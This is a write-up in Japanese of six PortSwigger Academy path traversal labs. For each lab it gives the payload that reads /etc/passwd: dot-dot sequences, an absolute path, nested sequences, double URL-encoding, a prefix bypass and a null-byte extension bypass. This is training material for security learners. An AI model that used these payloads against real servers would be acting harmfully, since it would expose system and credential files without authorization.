# Path Traversal
- [Path Traversal](#path-traversal)
  - [File path traversal, simple case](#file-path-traversal-simple-case)
    - [overview](#overview)
    - [Analyze \& Exploit](#analyze--exploit)
  - [File path traversal, traversal sequences blocked with absolute path bypass](#file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass)
    - [Overview](#overview-1)
    - [Analyze \& Exploit](#analyze--exploit-1)
  - [File path traversal, traversal sequences stripped non-recursively](#file-path-traversal-traversal-sequences-stripped-non-recursively)
    - [Overview](#overview-2)
    - [Analyze \& Exploit](#analyze--exploit-2)
  - [File path traversal, traversal sequences stripped with superfluous URL-decode](#file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode)
    - [Overview](#overview-3)
    - [Analyze \& Exploit](#analyze--exploit-3)
  - [File path traversal, validation of start of path](#file-path-traversal-validation-of-start-of-path)
    - [Overview](#overview-4)
    - [Analyze \& Exploit](#analyze--exploit-4)
  - [File path traversal, validation of file extension with null byte bypass](#file-path-traversal-validation-of-file-extension-with-null-byte-bypass)
    - [Ovewview](#ovewview)
    - [Analyze \& Exploit](#analyze--exploit-5)

## File path traversal, simple case
### overview

> This lab contains a path traversal vulnerability in the display of product images.
>
> To solve the lab, retrieve the contents of the /etc/passwd file.

https://portswigger.net/web-security/file-path-traversal/lab-simple

### Analyze & Exploit

`/`にアクセスすると、以下のようなリクエストが発生していることがわかります。

```text
GET /image?filename=38.jpg HTTP/2
Host: 0a09004d039a75d6878f949900e800bc.web-security-academy.net
Cookie: session=hK3Ip7zjZQXChm7OZzsq05ZJPT16jYif
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a09004d039a75d6878f949900e800bc.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: ja,en-US;q=0.9,en;q=0.8
```

`../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd`を`38.jpg`の代わりに送ると、`/etc/passwd`の中身を読み取ることができます。

## File path traversal, traversal sequences blocked with absolute path bypass

### Overview
```
This lab contains a path traversal vulnerability in the display of product images.

The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

To solve the lab, retrieve the contents of the /etc/passwd file.
```

https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass

### Analyze & Exploit

脆弱性がありそうな箇所は前回と同じです。

が、前回と同じペイロードを入れても`No such File`と言われてしまいます。

そこで、相対パス指定ではなく、絶対パス(`/etc/passwd`)で入れてみます。

これで`/etc/passwd`が読み取れます。

## File path traversal, traversal sequences stripped non-recursively

### Overview
```text
This lab contains a path traversal vulnerability in the display of product images.

The application strips path traversal sequences from the user-supplied filename before using it.

To solve the lab, retrieve the contents of the /etc/passwd file.
```

https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively

### Analyze & Exploit

`../`を取り除くらしいのでパズルをするだけです。

`..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././etc/passwd`

## File path traversal, traversal sequences stripped with superfluous URL-decode

### Overview
```text
This lab contains a path traversal vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the /etc/passwd file.
```

https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode

### Analyze & Exploit

これは仕様によってTraversal Sequenceが消される時はUrl Enocodeで対応しようねというラボなので、以下で終わりです。

```text
%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
```

## File path traversal, validation of start of path

### Overview

```text
This lab contains a path traversal vulnerability in the display of product images.

The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

To solve the lab, retrieve the contents of the /etc/passwd file.
```

### Analyze & Exploit

画像を取得する際のパラメータが以下のようになっています。

```
/image?filename=/var/www/images/23.jpg
```

この場合は、`/var/www/images`を期待する可能性があるので、`/var/www/images/../../`のようにする必要があります。

つまり、`/var/www/images/../../../../../../../../../../../../../../etc/passwd`で終わりです。

## File path traversal, validation of file extension with null byte bypass

### Ovewview

```text
This lab contains a path traversal vulnerability in the display of product images.

The application validates that the supplied filename ends with the expected file extension.

To solve the lab, retrieve the contents of the /etc/passwd file.
```

### Analyze & Exploit

アプリケーションは、ユーザーから与えられたファイル名が、.pngのような期待されるファイル拡張子で終わることを期待する時Null bytesを使用することで、Bypassできるというもの。

つまりこれで終わり。

```text
../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00.jpg
```
